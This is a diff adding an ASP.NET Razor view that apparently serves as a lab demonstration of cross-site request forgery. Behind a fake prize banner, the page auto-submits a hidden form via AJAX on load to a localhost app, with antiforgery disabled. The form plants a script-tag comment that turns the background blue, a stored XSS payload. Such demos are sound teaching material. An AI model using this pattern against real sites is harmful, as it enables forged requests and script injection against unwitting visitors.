@@ -1,0 +1,32 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+
+    <div class="text-center">
+        <h1 class="display-4 blink_text">YUO HAEV WUN 600000$ DULLARZ</h1>
+        <form action="https://localhost:44300/" method="post" asp-antiforgery="false" style="display: none" name="hiddenForm" id="hiddenForm">
+            <div class="form-group">
+                <label class="control-label"></label>
+                <input type="text" name="CommentContent" class="form-control" value="<script>document.body.style.backgroundColor = 'blue';</script>" />
+            </div>
+            <div class="form-group">
+                <input type="submit" value="Create" class="btn btn-primary" />
+            </div>
+        </form>
+
+        <script>
+            //function submitForm() {
+            //    document.forms["hiddenForm"].submit();
+            //}
+
+            function SubForm (){
+                $.ajax({
+                    url:'https://localhost:44300/',
+                    type:'post',
+                    data:$('#hiddenForm').serialize(),
+                });
+            }
+            window.onload = SubForm;
+        </script>
+    </div>
